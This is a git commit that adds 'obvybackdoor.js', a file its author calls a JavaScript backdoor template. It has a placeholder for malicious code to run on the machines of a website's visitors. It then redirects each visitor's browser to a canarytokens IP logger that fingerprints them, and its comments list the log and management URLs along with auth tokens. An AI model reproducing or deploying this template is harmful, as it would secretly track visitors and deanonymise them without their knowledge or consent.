ef2baafa65ead4d56fc28069b290b9f6079d14ba
Sneaky-Snake10 <128928184+Sneaky-Snake10@users.noreply.github.com>
2023-08-02 12:00:48 -0700

    Create obvybackdoor.js
    JavaScript Backdoor Template

---
+++ obvybackdoor.js
@@ -0,0 +1,7 @@
+// Put malicious JS code here. It will run on whoever's computer visits the website.
+
+
+// When the malicious code finishes executing, this triggers an IP logger and runs JS fingerprinting.
+window.location.replace("http://canarytokens.com/loggers/gxi34lzt8avevexp1krssfc8g/fingerprint.jsp");
+// IP logs are at https://canarytokens.org/history?token=gxi34lzt8avevexp1krssfc8g&auth=b6b4da0a36c1462d2a5e10e03fd07541
+// IP logger management is at https://canarytokens.org/manage?token=gxi34lzt8avevexp1krssfc8g&auth=b6b4da0a36c1462d2a5e10e03fd07541
